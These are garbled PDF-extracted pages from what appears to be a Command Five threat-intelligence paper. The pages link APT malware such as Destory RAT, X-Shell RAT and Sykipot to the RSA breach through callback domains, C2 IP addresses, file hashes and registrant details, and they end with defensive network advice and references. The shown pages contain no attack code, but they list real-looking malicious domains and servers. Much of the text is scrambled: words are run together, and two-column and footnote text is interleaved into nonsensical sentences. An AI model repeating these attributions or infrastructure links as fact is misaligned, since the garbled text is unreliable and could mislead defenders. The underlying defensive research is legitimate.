+‘dow.join3com.com’,‘ftp.join3com.com’,and	‘ico.join3com.com’are
+all known to have pointed to IP	address 175.45.22.220. The
+a
+domain
+is
+listed	
+known
+as	
+Backdoor:Win32/Thoper.Acallback	location.(Wong,	2011)
+68Thedomain‘yoyo.network­sec.net’	is	used	bymalwarewith
+MD5	hash‘37037F674BCB	BB7EEF3889AB	6EB3	0268’.(Threat
+ExpertLtd.,2008)
+PAGE14OF	29
+
+‘join3com.com’	
+‘catalog.join3com.com’
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+Compromised Code	Signing Certificate
+
+Travlman Links
+
+the
+
+Link to	RSA Breach
+
+(‘pingabm.network­sec.net’,’
+‘psbm11025.network­
+sec.net’and	‘psbm10.network­sec.net’69).
+TheobservedLURK	communicationsappearto	bethe
+same as those generated by malware that	was
+digitally	signed	using	acompromised	codesigning
+certificatethat	wasused	tosignaDestory	RAT,	and	
+in several attacks70.	That
+other malware used	
+malware
+domain
+communicates
+with	
+‘office.windowupdate.org’–adomainthat	is	linkedto
+‘alyac.org’not	only	by	thecommunicationsprotocol
+but	also	by	both domain registration tactic and
+infrastructure71.	(Fagerland,	2011)
+SK	
+in the
+The Destory	 RAT	 malware used	
+Communications hack72is	identical,	except for its
+configuration,to	malware73that	communicateswith	
+callback domain ‘wow.travlman.com’.	 The
+the
+callbackdomainpreviouslypointed	to	thesameIP
+address as that	used	in the SK	Communications
+hack74.	Both	of	themaliciousfileswerecompiled
+from the same code on 27	September 2010	at
+09:17:04GreenwichMeanTime(GMT)75,	andlater
+configured.	
+Thecallbackdomain‘wow.travlman.com’is	also	
+‘IP2B’
+that	
+produces
+used	
+by	 malware 76
+communications of	an identical
+format	to	those
+decoded from the
+in the Murcy	
+‘Extra­Data’
+communications.	This	highlightsanadditionallink
+																																																																			
+69Backdoor­FCQ uses	several	‘network­sec.net‘	subdomains	as
+callbacklocations.(McAfeeInc.,2011)
+70Thefirstreported	abuseofthecertificatewasinrelationtothe
+HupigontrojanwithMD5	hash	‘8800839871A3	3801B2B46F9E
+23B7	B7A5’. (Hispasec Sistemas, 2011) (Common Computer
+SecurityStandards)
+71Refer to the ‘LURK Communications’ section for additional
+information.
+72TheDestoryRATused	intheSK	Communications	hack	was
+hosted	 on a toolbox as	
+‘nateon.exe’, and	 called	 back	 to
+‘nateon.duamlive.com’.Ithas	aSHA1	hashof‘F84CD73DABF1
+86607F98	6DF9	8C5402A5	7BB58AD1’	and	MD5	of‘461884F1
+D41E9E0709B4	0AB2	CE5AFCA7’.(CommandFivePtyLtd,2011)
+73Malwarewith	theMD5	hash‘5FCE1FC18283D76C396A3CCC
+64BDBBDE’	callsbackto‘wow.travlman.com’.
+74Both	‘wow.travlman.com’	and	‘duamlive.com’	previouslypointed
+toIPaddress	203.160.67.131.(rbls,shenqi.travlman.comisnot
+listed	inanyblacklists,2011)(DomainTools,LLC)
+75Automatedanalysisreportsconfirmthecompilationtimeofthe
+codeand	that,whiletheMD5	hashofeach	ofthefiles	is	different,
+theMD5	hashes	ofeach	ofthecodesections,exceptforthe.data
+section, are identical.
+(Hispasec
+(Hispasec Sistemas, 2011)
+Sistemas,2011)
+76Malwarewith	MD5	hash‘B098	AEE1	6BD1	38C4	12075C9D
+315A	EFC9’.(ThreatExpertLtd,2010)
+PAGE15OF	29
+
+between
+the Destory	 RAT	
+the
+IP2B
+and	
+communications.
+Several other ‘travlman.com’ sub­domains are
+known to	exist77including at	least	one that	is	
+The
+associated	 with	 malware.
+sub­domain
+‘dm.travlman.com’78is	thecallbackused	by	malware
+by
+detected	
+as
+antivirus
+software
+‘Trojan:Win32/Boupke’79.	
+The majority	of	the known callback domains for
+MurcymalwarewereusedintheMarch	2011RSA
+breach.	Thissuggeststhat	theattackersresponsible
+fortheRSA breach	also	usetheMurcymalware.
+Given that	 the malware is	 reportedly	 not	
+in
+widespread	use,	theChineseservercommunicating
+with‘path.alyac.org’may	havebeencompromisedby
+thesameattackersresponsiblefortheRSA	breach.	
+TheX­ShellRAT	is	commercially	availablesoftware
+that	appears to	have been used in a number of
+attacks.	Therearenumerousversionsof	theX­Shell
+RAT,	and	notallproducethesamecommunications.	
+Malwarethat	generatesthesameX­ShellC601
+‘path.alyac.org’
+communications 80 observed
+appearsto	havebeenusedinanumberofattacks.
+Malwarethat	generatessimilarcommunicationsalso	
+appearstohavebeenusedinanumberof	attacks81.	
+That	malwareis	thought	tobeanX­ShellC603	RAT	
+and	not	anX­ShellC601	RAT.	It	is	not	knownwhether
+any	ofthesemaliciousfileswereused	bythesame
+																																																																			
+subdomains;
+‘travlman.com’
+known
+following	 are
+77The
+‘g.travlman.com’,
+‘dm.travlman.com’,
+‘g1.travlman.com’,
+‘g2.travlman.com’,
+‘mail.travlman.com’,
+‘luandao.travlman.com’,
+‘seo.travlman.com’,
+‘wayi.travlman.com’,
+‘shenqi.travlman.com’,
+and	‘www.travlman.com’.
+78Malwarewith	MD5	hash‘70A8	8091E1F9	A7BEE246	488C
+known
+request
+CE79
+to
+936A’	
+is	
+the
+webpage
+‘http://dm.travlman.com/up.txt’.(SunbeltSecurity,2009)
+79Malwarewith	MD5	hash‘70A8	8091E1F9	A7BEE246	488C
+CE79
+as
+by
+software
+antivirus
+detected	
+is
+936A’
+‘Trojan:Win32/Boupke.gen!A’,
+‘Trojan.Win32.Boupke!IK’,
+and
+‘Trojan.Win32.Boupke’.(HispasecSistemas,2009)
+80Automated	analysis	reports	existontheInternetforprobable	X­
+Shell601	malwarewith	MD5	hash‘65813CBB	660E91CD5FA0
+8300E177	EB09’,‘229947CC71A4601B8B7794B402E536A9’,
+‘DA2F98315F4C56FCE21273E21E453B76’,and‘F4C08D3D
+F5EDE0790E34EAE0C5DB8A7A’.(Hispasec Sistemas, 2011)
+(Threat Expert Ltd, 2011) (Threat Expert Ltd, 2011) (Threat
+ExpertLtd,	2011)
+81Automated	analysis	reports	existontheInternetforprobableX­
+Shell603	malwarewith	MD5	hash‘679993AD2CF8EFDC788E
+0BA204D69B0D’,and	’CE938C647831080B71165389E43E
+744D’.(HispasecSistemas,2011)(HispasecSistemas,2011)
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+X­Shell RAT
+
+to	
+
+Shared Alyac	Infrastructure
+
+and
+
+IP
+
+IP	address67.79.149.90previously	hosted	the
+attackers who	used	the X­shell malware which	
+knownSykipotdomain‘help.newcarstyle.com’.Both
+communicateswith	‘path.alyac.org’.
+67.79.149.90	
+address
+address
+IP	
+209.133.72.83	previously	hosted	‘bluelightness.com’
+subdomains85.	They	thereforehaveadditionallinksto	
+Thedomain‘alyac.org’previously	pointed	to	aC2
+Sykipot	activity	as‘shopping.bluelightness.com’was
+server located at	IP address 222.122.20.241	and	
+previously	hostedonIP	address209.53.155.244	­the
+anotherlocatedat	IP	address202.30.224.240.These
+same IP address as the known Sykipot	domains
+IP	addressesareassociatedwith	anumberofother
+‘www.topix21century.com’
+and
+‘bbs.ezxsoft.com’,
+including	
+callback
+domains
+‘notes.topix21century.com’86.	The‘bluelightness.com’
+‘pc.nprotects.org’,	 and	
+­
+the
+‘wow.travlman.com’
+domainis	also	linked	to	‘mail­kr2.com’­aDestory
+latterbeing	linked	toboth	theDestory	RAT	and	IP2B
+RAT	and	NightDragondomainpreviously	discussed.	
+communications(aspreviously	discussed)82.	
+Both	domainsshareinfrastructurewith	thedomain
+‘worldsecuritys.com’87.
+In	additionto	bothhaving	shared	infrastructure
+callback
+two
+the
+with	
+‘alyac.org’,	
+domains
+As
+domains
+6
+February,	
+the
+‘bbs.ezxsoft.com’and	‘pc.nprotects.org’areused	by
+‘file.filesdelete.com’,	
+and	
+‘news.welldone123.net’
+malwarethat	createsauniquely	named	directory83.	
+‘well.welldone123.net’ all point to the IP	address
+This	indicatesadirect	relationship	betweenthetwo
+allocated	to	the large US financial
+institution (to
+piecesofmalware.	
+which	‘todaygonever.com’also	previously	pointed.)	
+Thedomain‘welldone123.net’is	aknownSykipot	
+Thedomain‘ezxsoft.com’wasregistered	bythe
+callback domain88.	The domain ‘filesdelete.com’
+is
+sameentity	(‘LeeCooper’)asadomainused	intheSK
+also	otherwiseassociated	with	malware89.
+Communications hack (‘ro.diggfunny.com’),	further
+linking	it	to	thesameattackers.	TheC2	serverand	the
+in the domain
+listed	
+address
+The
+email
+callbackdomainsalso	havelinksto	amyriad	of	other
+for
+registration
+was
+‘todaygonever.com’
+maliciousactivity84.
+‘janagreen2000@gmail.com’.	Thesamecontact	email
+address(but	different	name,	address,	and	phoneand
+in the domain
+fax	 numbers) was also	 used	
+As
+previously	 discussed,	 before
+expired,	
+registration for ‘centurycpc.com’,	
+‘filesdelete.com’,
+‘todaygonever.com’pointedto	aC2serverassociated	
+‘quicklyfindme.com’,
+‘greenrightway.com’,
+and
+with	 both the Destroy	 RAT	 and NightDragon
+‘newcarstyle.com’–at	least	twoofwhich	areknown
+malware.	Thesamedomainis	also	associated	with	
+Sykipot	malwaredomains90.
+shared
+Sykipot
+activity	
+server
+infrastructure,	and	domainregistrationinformation.
+																																																																			
+Overits	lifetimethedomain‘todaygonever.com’
+67.79.149.90
+previously
+address
+hosted
+IP
+pointedto	numerousIP	addresses,	many	of	which	are
+209.133.72.83
+IP address
+‘helpdesk.bluelightness.com’
+and	
+85
+previouslyhosted	‘shopping.bluelightness.com’.
+not	noteworthyasthey	wereassigned	to	serversthat	
+address
+IP	
+209.53.155.244
+previously
+hosted
+hosted	numerouswebsites.	Fourof	theIP	addresses,	
+‘notes.topix21century.com’,
+‘shopping.bluelightness.com’,
+and
+86
+‘www.topix21century.com’. The webpage ‘topix21century.com’
+however,	are of	particular note – IP	addresses
+was	used,inwhatis	believed	tohavebeenatargeted	attack,to
+67.90.204.228
+discussed),
+(as
+previously	
+installSykipotmalwareoncomputers	which	visited	thewebpage.	
+67.79.149.90,	 209.133.72.83	 and	 an IP	 address
+The installed malware then communicated with a C2 server
+‘notes.topix21century.com’. (Symantec Corporation,
+located at
+allocated	to	alargeUSfinancialinstitution.	
+2010)(MalwareGroup.com)
+87In2011boththeknowncallback	domain‘cb85.mail­kr2.com’
+and	‘test.worldsecuritys.com’	pointed	toIP	address12.68.249.62,
+																																																																			
+the later still points	there as	of 9	February 2012. In 2011,
+‘bluelightness.com’	and‘worldsecuritys.com’	both	pointed	toIP
+address68.178.232.100,thelaterstillpoints	thereasof9	February
+82Malware detected as	
+'Trojan.Win32.AgentBypass' uses	the
+2012.
+'bbs.ezxsoft.com'. Malware
+callback
+detected	
+as
+‘Trojan.Win32.Generic’	usesthecallback	domain‘pc.nprotects.org’.
+88Thedomain‘welldone123.net’	isknowntobeassociatedwith
+(GFISandBox2011)(GFISandBox2011)
+theSykipotseries	ofattacks.(SymantecCorporation,2012)
+‘www.filesdelete.com’	
+89 The
+83 Both	 pieces	 of malware
+create
+named
+a
+directory
+is	 associated with
+domain
+‘Troj/Bdoor­BDM’.(Sophos	Ltd.,2012)
+‘03a075fb70d5d675f9dc26fc’	and	asubdirectorynamed	‘update’.
+(GFISandBox2011)(GFISandBox2011)
+90Thedomain‘help.newcarstyle.com’	isaknownSykipotcallback,
+asis‘greenrightway.com’.(SymantecCorporation,2012)(Malware
+84Forfurtherdetails	ofthelinks,refertothepaper‘SKHack	byan
+Domains,2012)
+AdvancedPersistentThreat’.(Command	FivePtyLtd,2011)
+PAGE16OF	29
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+through	
+
+of	
+
+it
+C2
+
+Sykipot Activity
+
+domain
+
+�
+
+�
+
+�
+
+�
+
+�
+
+�
+
+�
+
+INSIGHTS
+
+Increasingly,	instead	of	malwareusingthe
+default	DNSserversonacompromised	
+computerto	resolveits	callbackdomainsto
+IP	addresses,	attackerswillspecify	DNS	
+serversforthemalwaretouse.	Thishas
+significantimplicationsfornetwork
+defenders.	Such	requests,	ifallowed,	will
+bypassthevictim’sDNSserversand	defeat	
+any	blacklistsused	by	thevictim’sownDNS	
+servers.	Furthermore,	therequestswillnot	
+appearinthevictim’sDNSserverlogs,	
+making	detectionandinvestigationmore
+difficult.	
+Organisationsshould	considerblocking
+internalDNStraffic	toalllocationsother
+thanthecompany’s	ownDNS	servers.	
+Furthermoretheyshould	bealert	toany	DNS	
+communicationattempts	tolocationsother
+thanthecompany’s	ownDNS	servers,	asthis
+may	beanindicatorof	amalwareinfection.
+� Whencodesigning	certificatesarerevoked	
+thedateof	effect	of	therevocationis	chosen
+so	that,	wherepossible,	legitimatesoftware
+signed	with	thecertificatecontinuesto	
+validate.	Unfortunately,	thismeansthat	
+sometimesmalwaresignedwith	a
+compromised	certificatewillalso	continueto	
+validate(despitetherevocation).
+Somemalwareattempts	to	communicate
+with	C2infrastructureat	frequent	intervals.	
+Thefrequency	ofthesecommunication
+attemptscanbeusedtodetect	themalicious
+activity.
+TCP	port443	trafficisoftenallowed	outofa
+networkwithout	inspectionby	network
+security	appliancesasit	is	expected	to	be
+legitimate,	encrypted	SSLcommunications
+that	canbedifficult	to	inspect.	Unfortunately,	
+
+attackerstakeadvantageof	thisby	using	the
+portto	bypasssecurity	appliancesto
+communicatewith	aC2server(such	aswith	
+theobserved	X­Shellcommunications).
+Attackersoftenreusethesamecodefortheir
+malware.	Sometimestheywillrecompilethe
+code,	sometimesthey	willmerely	
+reconfigurethemalware.	Thisaltersthefile
+hash	and	thereforesuch	ahash	is	notan
+effectivesignatureforotherconfigurations
+of	themalware.	Hashesoftheindividualcode
+sections(e.g..text,.rdata,	.reloc)makefor
+morerobustdetectionassectionswithinthe
+maliciousfilesoftenremainthesame.	
+Themajority	oflegitimateexternalnetwork
+communicationsusetheDNS	protocolto	
+determinetheirdestination’sIP	address.	
+Outboundnetworkactivitythat	occurs	
+withoutaDNS	lookupshould	betreatedwith	
+suspicionuntilthepurposeof	the
+communicationscanotherwisebe
+determined.
+Blocking	outbound	communicationattempts
+that	arenot	preceded	by	aDNS	lookup	can
+beeffectiveinblockingC2	communication
+attemptsthat	aremadedirect	to	anIP	
+address(such	astoanIP	addresslisted	
+withinanX­Shellconfigurationwebpage).	
+LegitimatedestinationIPaddressesshould	
+bewhitelisted	to	prevent	legitimateactivity	
+fromalso	beingblocked.
+Attackerswillsometimescontinueto	usea
+callbackdomainevenwhenit	is	listed	on
+blacklistsand	inmultiplemalwareanalysis	
+reports.
+Blacklisting	adomaincanbeusefulbut	
+taking	thetimeto	research	thedomainand	
+associated	activity	canhelp	with	the
+developmentofmoreeffective,	longerterm	
+mitigationstrategies.
+Machinetranslationsoftwareand	automated	malwareanalysis	reports
+havebeenheavily	reliedonthroughout	thedevelopment	ofthis	paper.
+Whiledatahasbeenverified	againstmultiplesourceswherepossible,
+CommandFivePtyLtddoesnotguaranteetheveracity	of	sourcesorthe
+accuracy	of	theinformation.CommandFivePty	Ltd	reminds	readersto	
+exercise caution when visiting untrusted websites and/or opening
+untrusteddigitaldocuments.	Command	FivePty	Ltddoesnotwarrant
+that	thewebsitesreferencedinthispaperaretrustworthy.
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE17OF	29
+
+DISCLAIMER
+
+�
+
+�
+
+REFERENCES
+
+Blasco,	J.	(2012,	January12). Sykipot variant hijacks DOD and Windows smart cards.	Retrieved	February	05,	2012,	
+fromAlienvault	Labs:http://labs.alientvault.com/labs/index.php/2012/when­the­apt­owns­your­smart­
+cards­and­certs/
+CommandFivePty	Ltd.	(2011,	June). Advanced Persistent Threats: A	Decade	in Review.Retrieved	September24,
+2011,	fromCommand	FivePty	Ltd:	
+http://www.commandfive.com/papers/C5_APT_ADecadeInReview.pdf
+CommandFivePty	Ltd.	(2011,	September).	SK	Hack	by an Advanced Persistent Threat.	RetrievedJanuary	06,2012,	
+fromCommand	FivePty	Ltd:http://www.commandfive.com/papers/C5_APT_SKHack.pdf
+CommonComputerSecurityStandards.	(n.d.).	Digital	Certificates Used by	Malware.	RetrievedFebruary02,	2012,	
+fromCCSSForum:http://www.ccssforum.org/malware­certificates.php?&pag=4
+Coviello,	A.	(2011,	March	17).	Open Letter to	RSA Customers.	Retrieved	June13,	2011,from	RSA:	
+http://www.rsa.com/node.aspx?id=3872
+Deutsch,	P.(1996,May).	DEFLATE	Compressed Data Format Specification version 1.3.	Retrieved	January08,	2012,	
+fromIETF	RFC1951:http://www.ietf.org/rfc/rfc1951.txt
+Deutsch,	P.(1996,May).	ZLIB Compressed Data Format Specification version 3.3.	Retrieved	January	25,	2012,	from
+IETF	RFC1951:	http://www.ietf.org/rfc/rfc1950.txt
+DoctorWeb.	(2011,December29).	Dr. Web	Anti­virus ­ How To Remove Virus (Trojan.DownLoader4.20396) ­
+[DRWEBHK.COM].	Retrieved	December29,	2011,	from	Dr.	WebHK:	
+http://www.drwebhk.com/en/virus_techinfo/Trojan.DownLoader4.20396.html
+DomainTools,	LLC.	(n.d.). 203.160.67.131	IP	Address | WHOIS	| DomainTools.com.Retrieved	fromDomainTools:	
+http://whois.domaintools.com/203.160.67.131
+Dr.	Web.(2011,	July	10). Dr.Web ­ innovation IT­security	solutions. Complex protection against Internet threats.
+Retrieved	0203,	2012,from	Dr.Web:	http://vms.drweb.com/virus/?i=1007435
+Fagerland,	S.	(2011,	November17).	Invisible YNK, a Code	Signing Conundrum | Norman Blog.	Retrieved	December
+13,	2011,from	Norman.com:http://blogs.norman.com/2011/malware­detection­team/invisble­ynk­a­
+code­signing­conundrum
+F­SecureCorporation.(n.d.). Threat Description: Backdoor: W32/Hupigon.	Retrieved	December23,	2011,	from	F­
+Secure:	http://www.f­secure.com/v­descs/backdoor_w32_hupigon.shtml
+GFI	Sandbox.	(2010,	May	07).	GFI Sandbox Analysis Report.	Retrieved	January06,	2011,	from	GFI	Sandbox:
+http://xml.ssdsandbox.net/index.php/37405d5bcf64fb9547cacda95f4ce8b4
+GFI	SandBox.(2011,August	04).	GFI SandBox Analysis Report.	Retrieved	October17,	2011,	fromGFI	SandBox:	
+http://xml.ssdsandbox.net/index.php/91a268b317d2cc6569b85bb03a5ff841
+GFI	SandBox.(2011,July	15).	GFI SandBox Malware Analysis Report: Trojan.Win32.AgentBypass.	Retrieved	August
+25,	2011,from	http://xml.ssdsandbox.net/view/fdf2c5c2b1874efe7fd335092df2d3bc
+GFI	Sandbox.	(2011,	September04). GFI Sandbox Malware Analysis Report: Trojan.Win32.Generic.	Retrieved	
+January	06,	2012,	fromGFI	Sandbox:	
+http://xml.ssdsandbox.net/index.php/9addc6d573309399e2b878873a00a921
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE18OF	29
+
+GFI	SandBox.(2011,May	29).	GFI SandBox Malware Analysis Report: Trojan.Win32.Generic!SB
+Trojan.Trojan.Win32.Generic.	RetrievedSeptember2011,2011,	from	
+http://www.xml.ssandbox.net/view/bce1069dd099f15170c5fd05bae921b5
+GFI	Sandbox.	(2011,	March	20).	GFI Sandbox Malware Analysis Report: Trojan­Dropper.Win32.Wykores.	Retrieved
+January	06,	2012,	fromGFI	Sandbox:	
+http://xml.ssdsandbox.net/index.php/0d38d6c2b9eb817b40afc4272545a43b
+GFI	Software.(2010,December26). CWSandbox Report by MD5	at Sunbelt Security.	Retrieved	December27,2011,	
+fromSunbelt	Security:	
+http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=19b0227bec75bef93c6ccc
+549b6d2ba0	
+HispasecSistemas.	(2009,	April15). Antivirus scan for 70a88091e1f9a7bee246488cce79936a at 2009­04­15	
+11/52/02 UTC.	Retrieved	February02,	2012,	from	VirusTotal:	
+https://www.virustotal.com/file/63ac63f59700dbcc3778a9c1e9f5689869c86ac2aa3295ad93278f9244c
+ff7f4
+HispasecSistemas.	(2010,	May	22).	Antivirus	scan for	5bc597e48270f04ec9b683432432e352 at 2010­05­22	
+17/52/37 UTC	­ VirusTotal.	Retrieved	February	07,	2012,	fromVirusTotal:	
+https://www.virustotal.com/file/e4711259a3dd9af85b649cc8afcf34bc86d1d68ed7286db35f7b260e60
+27c110/analysis/
+HispasecSistemas.	(2011,	August	15).	Antivirus scan for	2d8a9038e151fb30d45ea8668afd2a8e	at 2011­08­15	
+13/34/31 UTC	­ VirusTotal.	Retrieved	February	03,	2012,	fromVirusTotal:	
+https://www.virustotal.com/file/76747e708d79925ba0817d48c96f4c85938bfe3f0f5b681ff204a09bd3e
+bc1cc/analysis
+HispasecSistemas.	(2011,	August	19).	Antivirus scan for	461884f1d41e9e0709b40ab2ce5afca7 at 2011­08­19	
+13/31/35 UTC.	Retrieved	February02,	2012,	from	VirusTotal:	
+https://www.virustotal.com/file/74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5
+a4fb1fe
+HispasecSistemas.	(2011,	November06).	Antivirus	scan for	5fce1fc18283d76c396a3ccc64bdbbde	at 2011­11­06	
+09/44/14 UTC.	Retrieved	January	30,	2012,	from	VirusTotal:	
+https://www.virustotal.com/file/4dc0c7d8d84838c9b209ea727bd4ab7471a88fba55b786f7e37ce6394
+565b6aa/analysis
+HispasecSistemas.	(2011,	November08).	Antivirus	scan for	754364d9db702dc715327b40bf97e556 at 2011­11­08
+18/29/09 UTC.	Retrieved	January	30,	2012,	from	VirusTotal:	
+https://www.virustotal.com/file/781c30714ff5304b7e9530ec879ef4ed7e94a0138537563b4c12b158c7
+bcab40/analysis
+HispasecSistemas.	(2011,	May	10).	VirusTotal	­ Free	Online	Virus, Malware and URL Scanner.RetrievedDecember
+30,	2011,from	VirusTotal:	
+http://www.virustotal.com/report.html?id=5e29960ba0bb544623b52e5db592242f30c05ca1336ec667
+d0a162b9a7584f90
+HispasecSistemas.	(2011,	November21).	VirusTotal	­ Free	Online Virus, Malware and URL Scanner.	Retrieved	
+December30,	2011,	from	VirusTotal:	http://www.virustotal.com/file­
+scan/report.html?id=deb83be93eb74a66b8c654ddb28c3a1c58ee89abf3a72ce616755deb6f9902c­
+1321864468
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE19OF	29
+
+HispasecSistemas.	(2011,	December21).	VirusTotal	­ Free	Online Virus, Malware and URL Scanner.	Retrieved	
+December30,	2011,	from	VirusTotal:	http://www.virustotal.com/file­
+scan/report.html?id=251b196f94d6a858941cb2e18b6879fc2d3f4ef580a8cae338f42e7776229fc­
+1324454798
+HispasecSistemas.	(2011,	May	24).	VirusTotal	­ Free	Online	Virus, Malware and URL Scanner.RetrievedJanuary	04,	
+2012,	fromVirusTotal:	http://www.virus­scan/file­
+scan/report.html?id=5999da598ee19708c997e77650b0b423c0337ebff16c6ad7d929fc3a84f10f13
+Kaspersky	LabZAO.	(2010,	January	12).	Backdoor.Win32.Agent.anvj.RetrievedDecember09,	2011,	from
+Securelist:http://www.securelist.com/en/descriptions/7440365/Backdoor.Win32.Agent.anvj
+Kurc,	D.(2011,April17).	Encyclopedia entry: TrojanDropper:Win32/Redsip.A	­ Learn more	about malware ­
+Microsoft Malware Protection Center.	Retrieved	January	25,	2012,from	MicrosoftMalwareProtection
+Center:
+http://www.microsoft.com/security/portal/threat/Encyclopedia/Entry.aspx?Name=Trojan.Dropper%3
+AWin32%2FRedsip.A
+Lelli,	A.	(2010,	March	12).	Zero­Day	Attack	on IE6	­ JS.Sykipot Doesn't Spare Retired Software.	RetrievedFebruary
+01,	2012,from	SymantecConnect	Community:	http://www.symantec.com/connect/blogs/zero­day­
+attack­ie6­jssykipot­doesn­t­spare­retired­software
+MalwareDomains.	(2012,January	16). Malware Domains.	RetrievedJanuary	30,2012,	from	MalwareDomains:	
+http://mirror1.malwaredomains.com/updates/20120116.txt
+MalwareGroup.com.	(n.d.).	209.53.155.244	|	Ipaddress.	Retrieved	January18,	2012,	from	MalwareGroup:	
+http://www.malwaregroup.com/ipaddresses/details/209.53.155.244
+McAfeeFoundationProfessionalServicesand	McAfeeLabs.	(2011,February10).	Global	Energy	Cyberattacks:
+"Night Dragon".RetrievedJune13,	2011,	from	McAfee:	http://www.mcafee.com/us/resources/white­
+papers/wp­global­energy­cyberattacks­night­dragon.pdf
+McAfeeInc.	(2011,	December22).	Backdoor­FCQ ­ Malware ­ McAfee	Labs	Threat Center.	RetrievedFebruary02,	
+2012,	fromMcAfeeLabsThreat	Center:http://www.mcafee.com/threat­
+intelligence/malware/default.aspx?id=670739
+Mendoza,	E.	(2011). TROJ_INJECT.AMR	| Low Risk | Trend Micro	Threat Encyclopedia.Retrieved	November21,	
+2011,	fromTrend	Micro:	http://about­
+threats.trendmicro.com/malware/aspx?language=au&name=TROJ_INJECT.AMR
+Microsoft.	(2007,	December10).	A	description of Svchost.exe	in Windows XP Professional	Edition.Retrieved	
+September07,	2011,	from	Microsoft	Support:http://support.microsoft.com/?kbid=314056
+Microsoft	Corporation.	(2011,	September07).	Locales	and Languages (Windows).	RetrievedJanuary24,2012,
+fromMicrosoft	SoftwareDevelopment	Network:	http://msdn.microsoft.com/en­
+us/library/dd318716.aspx
+Microsoft	Corporation.	(2011,	September07).	OSVERSIONINFOEX structure.	Retrieved	January	17,2012,from	
+Microsoft	SoftwareDevelopment	Network:	http://msdn.microsoft.com/en­
+us/library/windows/desktop/ms724833(v=vs.85).aspx
+Microsoft	Corporation.	(2011,	September07).	SYSTEM_INFO structure.	Retrieved	January	24,	2012,	from	Microsoft	
+MSDN:	http://msdn.microsoft.com/en­us/library/windows/desktop/ms724958(v=vs.85).aspx
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE20OF	29
+
+Mullaney,	C.	(2011,July	30).	Backdoor.Sogu Technical	Details	| Symantec.	Retrieved	August	18,	2011,	from	
+http://www.symantec.com/security_response/writeup.jsp?docid=2011­073003­5345­99&tabid=2
+Parkour,	M.(2011,July	05). contagio: Jul	5	CVE­2010­2883	PDF invitation.pdf with	Poison Ivy from 112.121.171.94 |
+pu.flower­show.org.Retrieved	January	28,2012,from	Contagio:	
+http://contagiodump.blogspot.com/2011/07/message­targeting­experts­on­Japan.html
+Parkour,	M.(2011,July	14). Jul	13 CVE­2010­2883 PDF Meeting Agenda with more Poison Ivy	www.adv138mail.com
+|	112.121.171.94.Retrieved	September22,	2011,	fromContagiodump	Blog:
+http://contagiodump.blogspot.com/2011/07/jul­13­cve­2010­2883­pdf­meeting­agenda.html
+Rasmussen,	R.	(2011). Practical	Usage of Passive	DNS	Monitoring for	E­Crime Investigations.	Retrieved	January04,
+2011,	fromhttp://conferences.npl.co.uk/satin/presentations/satin2011slide3­Rasmussen.pdf
+rbls.	(2011,November01).	shenqi.travlman.com is not listed in any blacklists.	Retrieved	November01,	2011,	from	
+rbls:	http://rbls.org/shenqi.travlman.com
+SafeZoneCast.	(2011,	August09).	SafeZoneCast.	Retrieved	December30,	2011,	from
+http://safezonecast.lgcns.com/Common/MenaceInfo/pop.MenaceInfo.jsp?code=SZ1108­0003NS
+Sandbox,	G.(2010,December26).	GFI Sandbox Malware Analysis Report: Trojan­Downloader.Win32.Generic.	
+Retrieved	November29,	2011,	from	GFI	Sandbox:
+http://xml.ssdsandbox.net/view/3df0d0ab4ad9da4559a1c6464c8526d1
+shapeless.	(n.d.).	Poison Ivy 2.3.0	Documentation.Retrieved	August	17,2011,	from	PoisonIvy	­Remote
+AdministrationTool:	http://www.poisonivy­rat.com/dl.php?file=230docs
+SophosLtd.	(2011,November25).	Detailed Analysis ­ Troj/Agent­UDR ­ Viruses and Spyware ­ Threat Analyses ­
+Threat Center ­ Sophos.Retrieved	December8,	2011,	from	Sophos:	http://www.sophos.com/en­
+us/threat­center/threat­analyses/viruses­and­spyware/Troj~Agent­UDR/detailed­analysis.aspx
+SophosLtd.	(2012,January	19).	Detailed Analysis ­ Troj/Bdoor­BDM ­ Viruses and Spyware ­ Threat Analyses ­
+Threat Center ­ Sophos.Retrieved	January	31,	2012,	fromSophosThreat	Center:
+http://www.sophos.com/en­us/threat­center/threat­analyses/viruses­and­spyware/Troj~BDoor­
+BDM/detailed­analysis.aspx
+Sunbelt.	(2009,	October15). Sunbelt CWSandbox Malware Analysis Report: Backdoor.Win32.Pasur.Retrieved	
+December19,	2011,	from	Sunbelt	Security	Sandbox:	
+http://xml.ssdsandbox.net/archive/42e8163b7f08dd383e62e4bdb7f07c08
+Sunbelt	Security.	(2009,	May03).	Sunbelt CWSandbox Malware Analysis Report.	Retrieved	December01,2011,
+fromSunbelt	Security	Sandbox:	
+http://xml.ssdsandbox.net/archive/70a88091e1f9a7bee246488cce79936a
+Sunbelt	Security.	(2009,	October16).	Sunbelt CWSandbox Malware Analysis Report: Trojan.Win32.Sisproc.	
+Retrieved	December19,	2011,	from	SunbeltSecurity	Sandbox:
+http://xml.ssdsandbox.net/archive/3fdea18b9610cbc9b63ba7a44899fbfb
+Sunbelt	Security.	(2010,	December31). CWSandbox Report by MD5	at Sunbelt Security.	RetrievedOctober25,	
+2011,	fromSunbelt	Security:
+http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=69ed8f7b0046956045a90
+e36e3c83f6a
+Sunbelt	Security.	(2010,	May12).	GFI SandBox Analysis Report.	RetrievedFebruary	07,	2012,from	Sunbelt
+Security	SandBox:http://xml.ssdsandbox/archive/5bc597e48270f04ec9b683432432e352
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE21OF	29
+
+SunbeltSecurity.	(2011,	June01). GFI SandBox Malware Analysis Report/ Trojan.Win32.Generic!SB.	Retrieved
+January	23,	2012,	fromGFI	SandBox:	
+http://xml.ssdsandbox.net/view/228191d05a09877f90c8b802617bb25f
